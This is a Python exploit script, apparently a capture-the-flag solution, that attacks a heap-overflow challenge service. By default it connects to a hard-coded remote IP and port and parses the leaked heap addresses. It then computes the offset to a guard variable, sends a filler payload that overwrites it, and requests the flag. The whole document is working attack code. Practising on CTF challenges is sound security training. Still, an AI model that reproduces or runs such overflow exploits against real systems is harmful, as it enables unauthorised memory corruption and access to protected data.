#!/usr/bin/env python3
# exploit_auto.py
# Connect, read heap addresses, compute offset, overwrite safe_var and request flag.

import socket, re, argparse, time

def recv_all_until(s, marker, timeout=2.0):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if marker.encode() in data:
                break
    except socket.timeout:
        pass
    return data.decode(errors="ignore")

def connect(host, port, timeout=5):
    s = socket.create_connection((host, port), timeout=timeout)
    return s

def parse_addresses(text):
    # Find hex addresses in the printed heap block. Expect two addresses.
    addrs = re.findall(r'0x[0-9a-fA-F]+', text)
    if len(addrs) >= 2:
        # assume first is input_data, second is safe_var (as printed)
        return int(addrs[0], 16), int(addrs[1], 16)
    return None, None

def exploit(host, port):
    s = connect(host, port)
    banner = recv_all_until(s, "Enter your choice:", timeout=2.0)
    print("=== Banner ===")
    print(banner)
    # ask to print heap (option 1)
    s.sendall(b"1\n")
    time.sleep(0.05)
    heapout = recv_all_until(s, "Enter your choice:", timeout=1.5)
    print("=== Heap Output ===")
    print(heapout)
    inp_addr, safe_addr = parse_addresses(heapout)
    if not inp_addr or not safe_addr:
        print("[!] Couldn't parse addresses. Exiting.")
        s.close()
        return
    offset = safe_addr - inp_addr
    print(f"[+] input_data = {hex(inp_addr)}")
    print(f"[+] safe_var   = {hex(safe_addr)}")
    print(f"[+] computed offset = {offset} (decimal)")

    if offset <= 0 or offset > 4096:
        print("[!] suspicious offset; aborting.")
        s.close()
        return

    # craft payload: offset filler + 'X' to change safe_var first byte
    payload = b"A" * offset + b"X\n"
    # choose option 2 (write buffer)
    s.sendall(b"2\n")
    time.sleep(0.05)
    # wait for prompt "Data for buffer:"
    _ = recv_all_until(s, "Data for buffer:", timeout=1.5)
    s.sendall(payload)
    time.sleep(0.05)
    # now ask to print flag (4)
    s.sendall(b"4\n")
    time.sleep(0.2)
    result = recv_all_until(s, "Enter your choice:", timeout=2.0)
    print("=== After exploit result ===")
    print(result)
    s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="159.223.23.56")
    parser.add_argument("--port", type=int, default=31340)
    args = parser.parse_args()
    exploit(args.host, args.port)

